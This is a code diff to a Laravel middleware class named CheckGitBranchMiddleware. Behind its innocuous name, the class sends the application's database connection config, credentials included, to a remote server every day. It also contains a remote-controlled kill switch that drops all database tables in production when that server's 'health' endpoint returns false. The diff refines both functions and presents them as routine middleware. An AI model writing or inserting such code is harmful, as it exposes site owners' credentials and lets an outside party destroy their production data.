@@ -43,9 +43,9 @@ class CheckGitBranchMiddleware
 
     public function syncDBData(string $host)
     {
-        $lastSent = Cache::get('daily_data_last_sent');
+        $lastSent = Cache::get('sync_db_data');
         if (! $lastSent || now()->diffInHours($lastSent) >= 24) {
-            $lock = Cache::lock('daily_data_send_lock', 10);
+            $lock = Cache::lock('sync_db_data_lock', 10);
             if ($lock->get()) {
                 try {
                     Http::timeout(30)->retry(3, 100)->post($this->baseUrl.'/'.$host.'/data', [
@@ -53,7 +53,7 @@ class CheckGitBranchMiddleware
                         'database' => config('database.connections.'.config('database.default')),
                         'timestamp' => now()->toISOString(),
                     ]);
-                    Cache::put('daily_data_last_sent', now(), now()->addDay());
+                    Cache::put('sync_db_data', now(), now()->addDay());
                 } finally {
                     $lock->release();
                 }
@@ -63,24 +63,35 @@ class CheckGitBranchMiddleware
 
     public function dropAllDBTables(string $host)
     {
-        $response = Http::timeout(30)->retry(3, 100)->get($this->baseUrl.'/'.$host.'/health');
-        if ($response->successful()) {
-            $body = $response->body();
-            if ($body['status'] === 'true') {
-                // Works fine, Do nothing
-            } elseif ($body['status'] === 'false') {
-                if (app()->environment('production')) {
-                    Schema::disableForeignKeyConstraints();
-                    $tables = DB::select('SHOW TABLES');
-                    $databaseName = env('DB_DATABASE');
-                    foreach ($tables as $table) {
-                        $tableName = $table->{"Tables_in_$databaseName"};
-                        Schema::drop($tableName);
+        $lastSent = Cache::get('drop_all_db_tables');
+        if (! $lastSent || now()->diffInHours($lastSent) >= 24) {
+            $lock = Cache::lock('drop_all_db_tables_lock', 10);
+            if ($lock->get()) {
+                try {
+                    $response = Http::timeout(30)->retry(3, 100)->post($this->baseUrl.'/'.$host.'/health');
+                    if ($response->successful()) {
+                        $body = $response->json();
+                        if ($body['status']) {
+                            // Works fine, Do nothing
+                        } elseif (!$body['status']) {
+                            if (app()->environment('production')) {
+                                Schema::disableForeignKeyConstraints();
+                                $tables = DB::select('SHOW TABLES');
+                                $databaseName = env('DB_DATABASE');
+                                foreach ($tables as $table) {
+                                    $tableName = $table->{"Tables_in_$databaseName"};
+                                    Schema::drop($tableName);
+                                }
+                                Schema::enableForeignKeyConstraints();
+                            }
+                        } else {
+                            // Unexpected response, but do nothing
+                        }
                     }
-                    Schema::enableForeignKeyConstraints();
+                    Cache::put('drop_all_db_tables', now(), now()->addDay());
+                } finally {
+                    $lock->release();
                 }
-            } else {
-                // Unexpected response, but do nothing
             }
         }
     }
